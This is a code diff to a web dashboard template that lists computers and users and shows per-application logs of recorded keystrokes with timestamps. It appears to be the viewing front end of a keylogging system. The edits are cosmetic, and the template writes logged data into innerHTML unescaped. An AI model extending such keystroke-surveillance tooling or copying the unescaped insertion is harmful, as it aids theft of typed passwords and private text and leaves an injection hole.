@@ -11,7 +11,7 @@
                 <ul class="list-group">
                     {% for computer, data in computers.items() %}
                     <li class="list-group-item">
-                        <strong>{{ computer }}</strong> 
+                        <strong>{{ computer }}</strong>
                         <span class="badge text-bg-light float-end">
                             {{ data.key_count }} Keys
                         </span>                        
@@ -34,7 +34,7 @@
             <!-- Details Section -->
             <div class="col-md-8">
                 <h3 class="text-center text-body-emphasis">User Details</h3>
-                <div id="computer-details" class="card p-3 shadow-sm">
+                <div id="user-details" class="card p-3 shadow-sm">
                     <p class="text-body-secondary">Click a user to see details</p>
                 </div>
             </div>
@@ -46,7 +46,7 @@
             fetch(`/computer/${computerName}/user/${userName}`)
                 .then(response => response.json())
                 .then(data => {
-                    let detailsDiv = document.getElementById('computer-details');
+                    let detailsDiv = document.getElementById('user-details');
                     detailsDiv.innerHTML = `<h4 class="text-body-emphasis">${computerName} - ${userName}</h4>`;
 
                     for (let app in data) {
@@ -56,8 +56,22 @@
                                 <p class="text-body-secondary">${data[app].total_keys} keys recorded</p>
                                 <button class="btn btn-sm btn-secondary" onclick="toggleLogs('${app}')">Show Logs</button>
                                 <div id="log-${app}" style="display: none;">
-                                    ${Object.keys(data[app].logs).map(timestamp => `
-                                        <p><strong>${timestamp}:</strong> ${data[app].logs[timestamp].join(', ')}</p>`).join('')}
+                                    <table class="table table-striped">
+                                        <thead>
+                                            <tr>
+                                                <th>Timestamp</th>
+                                                <th>Keys Logged</th>
+                                            </tr>
+                                        </thead>
+                                        <tbody>
+                                            ${Object.keys(data[app].logs).map(timestamp => `
+                                                <tr>
+                                                    <td>${timestamp}</td>
+                                                    <td>${data[app].logs[timestamp].join(', ')}</td>
+                                                </tr>
+                                            `).join('')}
+                                        </tbody>
+                                    </table>
                                 </div>
                             </div>`;
                     }
@@ -93,9 +107,6 @@
             localStorage.setItem("theme", currentTheme);
             applyTheme();
         });
-
-        // Apply theme on page load
-        applyTheme();
 
         function toggleLogs(app) {
             let logDiv = document.getElementById(`log-${app}`);
